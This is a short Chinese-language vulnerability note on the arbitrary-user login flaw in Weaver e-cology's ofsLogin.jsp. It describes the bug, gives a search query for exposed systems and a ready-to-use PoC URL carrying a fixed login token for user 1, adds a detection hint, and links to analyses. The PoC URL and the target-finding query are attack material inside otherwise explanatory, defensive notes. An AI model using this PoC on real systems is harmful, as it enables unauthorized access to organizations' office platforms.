# 泛微e-cology前台任意用户登录漏洞

## 漏洞描述

泛微新一代移动办公平台e-cology8.0不仅组织提供了一体化的协同工作平台,将组织事务逐渐实现全程电子化,改变传统纸质文件、实体签章的方式。泛微OA E-Cology v8.0平台ofsLogin.jsp处存在任意用户登录漏洞，攻击者通过漏洞可以登录网站后台。

## 影响范围

网络空间测绘：app="泛微-协同商务系统"

## 漏洞复现

直接使用POC登录

```
http://x.x.x.x/mobile/plugin/1/ofsLogin.jsp?gopage=/wui/index.html&loginTokenFromThird=866fb3887a60239fc112354ee7ffc168&receiver=1&syscode=1&timestamp
```

## 研判分析

关注请求路径'mobile/plugin/1/ofsLogin.jsp?syscode='及响应状态码信息。

## 参考链接

泛微ecology9 ofsLogin.jsp信息泄露与前台任意用户登录漏洞分析

<https://zhuanlan.zhihu.com/p/631500509>

漏洞复现:泛微e-cology ofsLogin.jsp任意用户登录漏洞

<https://f5.pm/go-163903.html>

Weaver_ofslogin_vul

<https://github.com/A0WaQ4/Weaver_ofslogin_vul/tree/main>

泛微e-cology9 changeUserInfo信息泄漏及ofsLogin任意用户登录漏洞分析

<https://0xf4n9x.github.io/weaver-ecology9-changeuserinfo-ofslogin.html>
